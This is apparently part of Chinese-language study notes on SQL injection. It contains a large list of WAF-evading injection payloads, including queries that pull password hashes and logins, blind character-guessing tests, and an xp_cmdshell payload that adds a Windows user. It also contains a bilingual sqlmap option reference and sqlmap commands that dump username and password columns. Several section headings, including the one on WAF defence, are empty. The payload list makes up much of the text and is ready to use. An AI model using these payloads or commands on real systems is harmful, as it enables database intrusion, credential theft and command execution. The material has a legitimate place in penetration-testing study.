	@@log_bin: 1
	#提取子字符串substr(‘abc’,1,1) = ‘a’
	substr(‘abc’ from 1 for 1) = ‘a’
	substring(‘abc’,1,1) = ‘a’
	substring(‘abc’ from 1 for 1) = ‘a’
	mid(‘abc’,1,1) = ‘a’
	mid(‘abc’ from 1 for 1) = ‘a’
	lpad(‘abc’,1,space(1)) = ‘a’
	rpad(‘abc’,1,space(1)) = ‘a’
	left(‘abc’,1) = ‘a’
	reverse(right(reverse(‘abc’),1)) = ‘a’
	insert(insert(‘abc’,1,0,space(0)),2,222,space(0)) = ‘a’
	space(0) = trim(version()from(version()))
	#搜索子字符串
	locate(‘a’,'abc’)
	position(‘a’,'abc’)
	position(‘a’ IN ‘abc’)
	instr(‘abc’,'a’)
	substring_index(‘ab’,'b’,1)
	#分割字符串
	length(trim(leading ‘a’ FROM ‘abc’))
	length(replace(‘abc’, ‘a’, ”))
	#比较字符串
	strcmp(‘a’,'a’)
	mod(‘a’,'a’)
	find_in_set(‘a’,'a’)
	field(‘a’,'a’)
	count(concat(‘a’,'a’))
	#字符串长度
	length()
	bit_length()
	char_length()
	octet_length()
	bit_count()
	#关键字过滤
	Connected keyword filtering
	(0)union(select(table_name),column_name,…
	0/**/union/*!50000select*/table_name`foo`/**/…
	0%a0union%a0select%09group_concat(table_name)….
	0′union all select all`table_name`foo from`information_schema`. `tables`
	#控制流
	case ‘a’ when ‘a’ then 1 [else 0] end
	case when ‘a’='a’ then 1 [else 0] end
	if(‘a’='a’,1,0)
	ifnull(nullif(‘a’,'a’),1)

###测试向量
	%55nion(%53elect 1,2,3)-- -
	+union+distinctROW+select+
	/**//*!12345UNION SELECT*//**/
	/**/UNION/**//*!50000SELECT*//**/
	/*!50000UniON SeLeCt*/
	+#uNiOn+#sEleCt
	+#1q%0AuNiOn all#qa%0A#%0AsEleCt
	/*!u%6eion*/ /*!se%6cect*/
	+un/**/ion+se/**/lect
	uni%0bon+se%0blect
	%2f**%2funion%2f**%2fselect
	union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
	REVERSE(noinu)+REVERSE(tceles)
	/*--*/union/*--*/select/*--*/
	union (/*!/**/ SeleCT */ 1,2,3)
	/*!union*/+/*!select*/
	union+/*!select*/
	/**//*!union*//**//*!select*//**/
	/*!uNIOn*/ /*!SelECt*/
	+union+distinctROW+select+
	-15+(uNioN)+(sElECt)
	-15+(UnI)(oN)+(SeL)(ecT)+
	id=1+UnIOn/**/SeLect 1,2,3—
	id=1+UNIunionON+SELselectECT 1,2,3—
	id=1+/*!UnIOn*/+/*!sElEcT*/ 1,2,3—
	id=1 and (select 1)=(Select 0xAA 1000 more A’s)+UnIoN+SeLeCT 1,2,3—
	id=1+un/**/ion+sel/**/ect+1,2,3--
	id=1+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/1,2,3
	id=1+/**/union/*&id=*/select/*&id=*/column/*&id=*/from/*&id=*/table--
	id=1+/**/union/*&id=*/select/*&id=*/1,2,3--
	id=-1 and (select 1)=(Select 0xAA*1000) /*!UNION*/ /*!SELECT*//**/1,2,3,4,5,6—x
	/**/union/*&id=*/select/*&id=*/column/*&id=*/from/*&id=*/table--
	/*!union*/+/*!select*/+1,2,3—
	/*!UnIOn*//*!SeLect*/+1,2,3—
	un/**/ion+sel/**/ect+1,2,3—
	/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/1,2,3—
	ID=66+UnIoN+aLL+SeLeCt+1,2,3,4,5,6,7,(SELECT+concat(0x3a,id,0x3a,password,0x3a)+FROM+information_schema.columns+WH
	ERE+table_schema=0x6334706F645F666573746976616C5F636D73+AND+table_name=0x7573657273),9,10,11,12,13,14,15,16,17,
	18,19,20,21,22,23,24,25,26,27,28,29,30--
	?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
	index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123
	?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,
	?id=15+/*!UnIoN*/+/*!aLl*/+/*!SeLeCt*/+1,version(),3,4,5,6,7--
	id=1/*!limit+0+union+select+concat_ws(0×3a,table_name,column_name)+from+information_schema.columns*/
	id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(TABLE_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.TABLES--
	id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WH
	ERE+TABLE_NAME=0x41646d696e--
	SELECT*FROM(test)WHERE(name)IN(_ucs2 0x01df010e004d00cf0148);
	SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) in xml way
	select user from mysql.user where user = 'user' OR mid(password,1,1)=unhex('2a')
	select user from mysql.user where user = 'user' OR mid(password,1,1) regexp '[*]'
	select user from mysql.user where user = 'user' OR mid(password,1,1) like '*'
	select user from mysql.user where user = 'user' OR mid(password,1,1) rlike '[*]'
	select user from mysql.user where user = 'user' OR ord(mid(password,1,1))=42
	/?id=1+union+(select'1',concat(login,hash)from+users)
	/?id=(1)union(((((((select(1),hex(hash)from(users))))))))
	?id=1'; /*&id=1*/ EXEC /*&id=1*/ master..xp_cmdshell /*&id=1*/ net user lucifer UrWaFisShiT /*&id=1*/ --
	id=10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)
	id=10 and 1=0/(select top 1 table_name from information_schema.tables)
	id=-725+UNION+SELECT+1,GROUP_CONCAT(id,0x3a,login,0x3a,password,0x3a,email,0x3a,access_level),3,4,5+FROM+Admin--
	id=-725+UNION+SELECT+1,version(),3,4,5--sp_password //使用sp_password隐藏log中的请求

##sql注入防护技术（WAF）



#sql注入工具

##sqlmap
###sqlmap简介
注入模式（BESTQU）
1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
4、联合查询注入，可以使用union的情况下的注入。
5、堆查询注入，可以同时执行多条语句的执行时的注入。


###sqlmap中英文说明文档（参数详解及使用语法）
Usage: python sqlmap.py [options]

Options（选项）:

	-h, --help            Show basic help message and exit        显示此帮助消息并退出
	-hh                   Show advanced help message and exit     展示先进的帮助信息并退出
	--version             Show program's version number and exit  显示程序的版本号并退出
	-v VERBOSE            Verbosity level: 0-6 (default 1)        详细级别：0-6（默认为1） 

Target（目标）:

	At least one of these options has to be provided to define the  
	target(s)
	以下至少需要设置其中一个选项，设置目标URL。
	
	-d DIRECT           Connection string for direct database connection        直接连接到数据库。
	-u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")   目标URL。
	-l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file   解析目标(s)从Burp或WebScarab代理日志文件
	-x SITEMAPURL       Parse target(s) from remote sitemap(.xml) file          解析目标(s)从远程站点地图文件(.xml)
	-m BULKFILE         Scan multiple targets given in a textual file           扫描文本文件中给出的多个目标
	-r REQUESTFILE      Load HTTP request from a file                           从文件加载HTTP请求
	-g GOOGLEDORK       Process Google dork results as target URLs              处理Google dork的结果作为目标URL。
	-c CONFIGFILE       Load options from a configuration INI file              从INI配置文件中加载选项。

Request（请求）:

	These options can be used to specify how to connect to the target URL   这些选项可以用来指定如何连接到目标URL。
	
	--method=METHOD     Force usage of given HTTP method (e.g. PUT)          强制使用给定的HTTP方法（e.g. PUT）
	--data=DATA         Data string to be sent through POST                  通过POST发送的数据字符串
	--param-del=PARA..  Character used for splitting parameter values        用于拆分参数值的字符
	--cookie=COOKIE     HTTP Cookie header value                             HTTP Cookie头的值
	--cookie-del=COO..  Character used for splitting cookie values           用于分割Cookie值的字符
	--load-cookies=L..  File containing cookies in Netscape/wget format      包含Netscape / wget格式的cookie的文件
	--drop-set-cookie   Ignore Set-Cookie header from response               从响应中忽略Set-Cookie头
	--user-agent=AGENT  HTTP User-Agent header value                         指定 HTTP User - Agent头  
	--random-agent      Use randomly selected HTTP User-Agent header value   使用随机选定的HTTP User - Agent头 
	--host=HOST         HTTP Host header value                                HTTP主机头值
	--referer=REFERER   HTTP Referer header value                             指定 HTTP Referer头
	-H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")      额外header
	--headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123") 额外header
	--auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI) HTTP认证类型(Basic, Digest, NTLM or PKI)
	--auth-cred=AUTH..  HTTP authentication credentials (name:password)       HTTP认证凭证(name:password)
	--auth-file=AUTH..  HTTP authentication PEM cert/private key file         HTTP认证 PEM认证/私钥文件
	--ignore-401        Ignore HTTP Error 401 (Unauthorized)                  忽略HTTP错误401(未经授权)
	--proxy=PROXY       Use a proxy to connect to the target URL              使用代理连接到目标网址
	--proxy-cred=PRO..  Proxy authentication credentials (name:password)      代理认证证书(name:password) 
	--proxy-file=PRO..  Load proxy list from a file                           从文件中加载代理列表
	--ignore-proxy      Ignore system default proxy settings                  忽略系统默认代理设置
	--tor               Use Tor anonymity network                             使用Tor匿名网络
	--tor-port=TORPORT  Set Tor proxy port other than default                 设置Tor代理端口而不是默认值
	--tor-type=TORTYPE  Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5) 设置Tor代理类型
	--check-tor         Check to see if Tor is used properly                  检查Tor是否正确使用
	--delay=DELAY       Delay in seconds between each HTTP request             每个HTTP请求之间的延迟（秒）
	--timeout=TIMEOUT   Seconds to wait before timeout connection (default 30) 秒超时连接前等待（默认30）
	--retries=RETRIES   Retries when the connection timeouts (default 3)       连接超时时重试（默认值3）
	--randomize=RPARAM  Randomly change value for given parameter(s)           随机更改给定参数的值(s)
	--safe-url=SAFEURL  URL address to visit frequently during testing         在测试期间频繁访问的URL地址
	--safe-post=SAFE..  POST data to send to a safe URL                        POST数据发送到安全URL
	--safe-req=SAFER..  Load safe HTTP request from a file                     从文件加载安全HTTP请求
	--safe-freq=SAFE..  Test requests between two visits to a given safe URL   在两次访问给定安全网址之间测试请求
	--skip-urlencode    Skip URL encoding of payload data                      跳过有效载荷数据的URL编码
	--csrf-token=CSR..  Parameter used to hold anti-CSRF token                 参数用于保存anti-CSRF令牌
	--csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token        提取anti-CSRF URL地址访问令牌
	--force-ssl         Force usage of SSL/HTTPS                               强制使用SSL / HTTPS
	--hpp               Use HTTP parameter pollution method                    使用HTTP参数pollution的方法
	--eval=EVALCODE     Evaluate provided Python code before the request (e.g. 评估请求之前提供Python代码			"import hashlib;id2=hashlib.md5(id).hexdigest()")

Optimization（优化）:

	These options can be used to optimize the performance of sqlmap    这些选项可用于优化sqlmap的性能
	
	-o                  Turn on all optimization switches                        开启所有优化开关
	--predict-output    Predict common queries output                            预测常见的查询输出
	--keep-alive        Use persistent HTTP(s) connections                       使用持久的HTTP（S）连接
	--null-connection   Retrieve page length without actual HTTP response body   从没有实际的HTTP响应体中检索页面长度
	--threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)    最大的HTTP（S）请求并发量（默认为1）

Injection（注入）:

	These options can be used to specify which parameters to test for,
	provide custom injection payloads and optional tampering scripts 
	这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。
	
	-p TESTPARAMETER    Testable parameter(s)                                      可测试的参数（S）
	--skip=SKIP         Skip testing for given parameter(s)                        跳过对给定参数的测试
	--skip-static       Skip testing parameters that not appear to be dynamic      跳过测试不显示为动态的参数
	--param-exclude=..  Regexp to exclude parameters from testing (e.g. "ses")     使用正则表达式排除参数进行测试（e.g. "ses"）
	--dbms=DBMS         Force back-end DBMS to this value                          强制后端的DBMS为此值  
	--dbms-cred=DBMS..  DBMS authentication credentials (user:password)            DBMS认证凭证(user:password) 
	--os=OS             Force back-end DBMS operating system to this value         强制后端的DBMS操作系统为这个值
	--invalid-bignum    Use big numbers for invalidating values                    使用大数字使值无效
	--invalid-logical   Use logical operations for invalidating values             使用逻辑操作使值无效
	--invalid-string    Use random strings for invalidating values                 使用随机字符串使值无效
	--no-cast           Turn off payload casting mechanism                         关闭有效载荷铸造机制
	--no-escape         Turn off string escaping mechanism                         关闭字符串转义机制
	--prefix=PREFIX     Injection payload prefix string                            注入payload字符串前缀
	--suffix=SUFFIX     Injection payload suffix string                            注入payload字符串后缀  
	--tamper=TAMPER     Use given script(s) for tampering injection data           使用给定的脚本（S）修正注入payload

Detection（检测）:

	These options can be used to customize the detection phase 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。
	
	--level=LEVEL       Level of tests to perform (1-5, default 1)          执行测试的等级（1-5，默认为1）
	--risk=RISK         Risk of tests to perform (1-3, default 1)           执行测试的风险（0-3，默认为1）
	--string=STRING     String to match when query is evaluated to True     查询时有效时在页面匹配字符串 
	--not-string=NOT..  String to match when query is evaluated to False    当查询求值为无效时匹配的字符串
	--regexp=REGEXP     Regexp to match when query is evaluated to True     查询时有效时在页面匹配正则表达式
	--code=CODE         HTTP code to match when query is evaluated to True  当查询求值为True时匹配的HTTP代码
	--text-only         Compare pages based only on the textual content     仅基于在文本内容比较网页
	--titles            Compare pages based only on their titles            仅根据他们的标题进行比较

Techniques（技巧）:

	These options can be used to tweak testing of specific SQL injection
	techniques 
	这些选项可用于调整具体的SQL注入测试。 
	
	--technique=TECH    SQL injection techniques to use (default "BEUSTQ")      SQL注入技术测试（默认BEUST）
	--time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)          DBMS响应的延迟时间（默认为5秒）
	--union-cols=UCOLS  Range of columns to test for UNION query SQL injection  定列范围用于测试UNION查询注入
	--union-char=UCHAR  Character to use for bruteforcing number of columns     用于暴力猜解列数的字符
	--union-from=UFROM  Table to use in FROM part of UNION query SQL injection  要在UNION查询SQL注入的FROM部分使用的表
	--dns-domain=DNS..  Domain name used for DNS exfiltration attack            域名用于DNS漏出攻击
	--second-order=S..  Resulting page URL searched for second-order response   生成页面的URL搜索为second-order响应

Fingerprint（指纹）:

	-f, --fingerprint   Perform an extensive DBMS version fingerprint           执行检查广泛的DBMS版本指纹

Enumeration（枚举）:

	These options can be used to enumerate the back-end database
	management system information, structure and data contained in the
	tables. Moreover you can run your own SQL statements                  
	这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。  
	
	-a, --all           Retrieve everything                             检索一切
	-b, --banner        Retrieve DBMS banner                            检索数据库管理系统的标识  
	--current-user      Retrieve DBMS current user                      检索数据库管理系统的标识  
	--current-db        Retrieve DBMS current database                  检索数据库管理系统当前数据库  
	--hostname          Retrieve DBMS server hostname                   检索数据库服务器的主机名
	--is-dba            Detect if the DBMS current user is DBA          检测DBMS当前用户是否DBA  
	--users             Enumerate DBMS users                            枚举数据库管理系统用户
	--passwords         Enumerate DBMS users password hashes            枚举数据库管理系统用户密码哈希
	--privileges        Enumerate DBMS users privileges                 枚举数据库管理系统用户的权限  
	--roles             Enumerate DBMS users roles                      枚举数据库管理系统用户的角色  
	--dbs               Enumerate DBMS databases                        枚举数据库管理系统数据库
	--tables            Enumerate DBMS database tables                  枚举的DBMS数据库中的表  
	--columns           Enumerate DBMS database table columns           枚举DBMS数据库表列
	--schema            Enumerate DBMS schema                           枚举数据库架构
	--count             Retrieve number of entries for table(s)         检索表的条目数
	--dump              Dump DBMS database table entries                转储数据库管理系统的数据库中的表项
	--dump-all          Dump all DBMS databases tables entries               转储数据库管理系统的数据库中的表项
	--search            Search column(s), table(s) and/or database name(s)   搜索列（S），表（S）和/或数据库名称（S）
	--comments          Retrieve DBMS comments                               检索数据库的comments(注释、评论)
	-D DB               DBMS database to enumerate                           要进行枚举的数据库名 
	-T TBL              DBMS database table(s) to enumerate                  要进行枚举的数据库表
	-C COL              DBMS database table column(s) to enumerate           要进行枚举的数据库列 
	-X EXCLUDECOL       DBMS database table column(s) to not enumerate       要不进行枚举的数据库列 
	-U USER             DBMS user to enumerate                               用来进行枚举的数据库用户 
	--exclude-sysdbs    Exclude DBMS system databases when enumerating tables   枚举表时排除系统数据库 
	--pivot-column=P..  Pivot column name                                       主列名称
	--where=DUMPWHERE   Use WHERE condition while table dumping                 使用WHERE条件进行表转储
	--start=LIMITSTART  First query output entry to retrieve                    第一个查询输出进入检索
	--stop=LIMITSTOP    Last query output entry to retrieve                     最后查询的输出进入检索
	--first=FIRSTCHAR   First query output word character to retrieve           第一个查询输出字的字符检索 
	--last=LASTCHAR     Last query output word character to retrieve            最后查询的输出字字符检索 
	--sql-query=QUERY   SQL statement to be executed                            要执行的SQL语句
	--sql-shell         Prompt for an interactive SQL shell                     提示交互式SQL的shell
	--sql-file=SQLFILE  Execute SQL statements from given file(s)               从给定文件执行SQL语句

Brute force（蛮力）:

	These options can be used to run brute force checks         这些选项可以被用来运行蛮力检查。
	
	--common-tables     Check existence of common tables        检查存在共同表 
	--common-columns    Check existence of common columns       检查存在共同列

User-defined function injection（用户自定义函数注入）:
	These options can be used to create custom user-defined functions   这些选项可以用来创建用户自定义函数。

	--udf-inject        Inject custom user-defined functions        注入用户自定义函数  
	--shared-lib=SHLIB  Local path of the shared library            共享库的本地路径 

File system access（访问文件系统）:

	These options can be used to access the back-end database management      
	system underlying file system
	这些选项可以被用来访问后端数据库管理系统的底层文件系统。
	
	--file-read=RFILE   Read a file from the back-end DBMS file system        从后端的数据库管理系统文件系统读取文件  
	--file-write=WFILE  Write a local file on the back-end DBMS file system   编辑后端的数据库管理系统文件系统上的本地文件
	--file-dest=DFILE   Back-end DBMS absolute filepath to write to           后端的数据库管理系统写入文件的绝对路径

Operating system access（操作系统访问）:

	These options can be used to access the back-end database management
	system underlying operating system  
	这些选项可以用于访问后端数据库管理系统的底层操作系统。
	
	--os-cmd=OSCMD      Execute an operating system command                     执行操作系统命令 
	--os-shell          Prompt for an interactive operating system shell        交互式的操作系统的shell
	--os-pwn            Prompt for an OOB shell, Meterpreter or VNC             获取一个OOB shell，meterpreter或VNC 
	--os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC   一键获取一个OOB shell，meterpreter或VNC 
	--os-bof            Stored procedure buffer overflow exploitation           存储过程缓冲区溢出利用
	--priv-esc          Database process user privilege escalation              数据库进程用户权限提升
	--msf-path=MSFPATH  Local path where Metasploit Framework is installed      Metasploit Framework本地的安装路径
	--tmp-path=TMPPATH  Remote absolute path of temporary files directory       远程临时文件目录的绝对路径

Windows registry access（Windows注册表访问）:

	These options can be used to access the back-end database management
	system Windows registry     
	这些选项可以被用来访问后端数据库管理系统Windows注册表。
	
	--reg-read          Read a Windows registry key value           读一个Windows注册表项值
	--reg-add           Write a Windows registry key value data     写一个Windows注册表项值数据
	--reg-del           Delete a Windows registry key value         删除Windows注册表键值
	--reg-key=REGKEY    Windows registry key                        Windows注册表键 
	--reg-value=REGVAL  Windows registry key value                  Windows注册表项值 
	--reg-data=REGDATA  Windows registry key value data             Windows注册表键值数据  
	--reg-type=REGTYPE  Windows registry key value type             Windows注册表项值类型

General（一般）:

	These options can be used to set some general working parameters    这些选项可以用来设置一些一般的工作参数。 
	
	-s SESSIONFILE      Load session from a stored (.sqlite) file                   保存和恢复检索会话文件的所有数据
	-t TRAFFICFILE      Log all HTTP traffic into a textual file                    记录所有HTTP流量到一个文本文件中
	--batch             Never ask for user input, use the default behaviour         从不询问用户输入，使用所有默认配置。 
	--binary-fields=..  Result fields having binary values (e.g. "digest")          具有二进制值的结果字段
	--charset=CHARSET   Force character encoding used for data retrieval            强制用于数据检索的字符编码
	--crawl=CRAWLDEPTH  Crawl the website starting from the target URL              从目标网址开始抓取网站
	--crawl-exclude=..  Regexp to exclude pages from crawling (e.g. "logout")       正则表达式排除网页抓取
	--csv-del=CSVDEL    Delimiting character used in CSV output (default ",")       分隔CSV输出中使用的字符
	--dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)       转储数据的格式
	--eta               Display for each output the estimated time of arrival       显示每个输出的预计到达时间
	--flush-session     Flush session files for current target                      刷新当前目标的会话文件
	--forms             Parse and test forms on target URL                          在目标网址上解析和测试表单
	--fresh-queries     Ignore query results stored in session file                 忽略在会话文件中存储的查询结果
	--hex               Use DBMS hex function(s) for data retrieval                 使用DBMS hex函数进行数据检索
	--output-dir=OUT..  Custom output directory path                                自定义输出目录路径
	--parse-errors      Parse and display DBMS error messages from responses        解析和显示响应中的DBMS错误消息
	--save=SAVECONFIG   Save options to a configuration INI file                    保存选项到INI配置文件
	--scope=SCOPE       Regexp to filter targets from provided proxy log            使用正则表达式从提供的代理日志中过滤目标
	--test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)           根据有效负载和/或标题(e.g. ROW)选择测试
	--test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)       根据有效负载和/或标题跳过测试（e.g. BENCHMARK）
	--update            Update sqlmap                                                更新SqlMap

Miscellaneous（杂项）:

	-z MNEMONICS        Use short mnemonics (e.g. "flu,bat,ban,tec=EU")         使用简短的助记符
	--alert=ALERT       Run host OS command(s) when SQL injection is found      在找到SQL注入时运行主机操作系统命令
	--answers=ANSWERS   Set question answers (e.g. "quit=N,follow=N")           设置问题答案
	--beep              Beep on question and/or when SQL injection is found     发现SQL注入时提醒
	--cleanup           Clean up the DBMS from sqlmap specific UDF and tables   SqlMap具体的UDF和表清理DBMS 
	--dependencies      Check for missing (non-core) sqlmap dependencies        检查是否缺少（非内核）sqlmap依赖关系
	--disable-coloring  Disable console output coloring                         禁用控制台输出颜色
	--gpage=GOOGLEPAGE  Use Google dork results from specified page number      使用Google dork结果指定页码
	--identify-waf      Make a thorough testing for a WAF/IPS/IDS protection    对WAF / IPS / IDS保护进行全面测试
	--skip-waf          Skip heuristic detection of WAF/IPS/IDS protection      跳过启发式检测WAF / IPS / IDS保护
	--mobile            Imitate smartphone through HTTP User-Agent header       通过HTTP User-Agent标头模仿智能手机
	--offline           Work in offline mode (only use session data)            在离线模式下工作（仅使用会话数据）
	--page-rank         Display page rank (PR) for Google dork results          Google dork结果显示网页排名（PR）
	--purge-output      Safely remove all content from output directory         安全地从输出目录中删除所有内容
	--smart             Conduct thorough tests only if positive heuristic(s)    只有在正启发式时才进行彻底测试
	--sqlmap-shell      Prompt for an interactive sqlmap shell                  提示交互式sqlmap shell
	--wizard            Simple wizard interface for beginner users              给初级用户的简单向导界面

	
###sqlmap常用注入语句

###sqlmap高级注入技术
--prefix,--suffix
--tamper

###sqlmap注入实战技术
1. POST注入

		- 读取文件的方法
		用Burp抓包，然后保存抓取到的内容。例如：保存为post.txt,然后把它放至某个目录下
		sqlmap.py -r "c:\Users\fendo\Desktop\post.txt" -p n --dbs  
		注：-r表示加载一个文件，-p指定参数
		sqlmap.py -r "c:\Users\fendo\Desktop\post.txt" -p n -D fendo -T user -C “username,password” --dump 
		
		- 自动搜索表单的方法
		sqlmap.py -u "http://192.168.160.1/sqltest/post.php" --forms
		
		- 指定一个参数的方法
		sqlmap -u http://xxx.xxx.com/Login.asp --data "n=1&p=1"

2. cookie注入

	sqlmap.py -u "http://192.168.87.129/shownews.asp" --cookie "id=27" --table --level 2 
	注：--level至少应为2


###sqlmap代码分析

###自写payload

	
	
###自写tamper

###sqlmap与burp联用

##注入常用工具


##注入工具编程




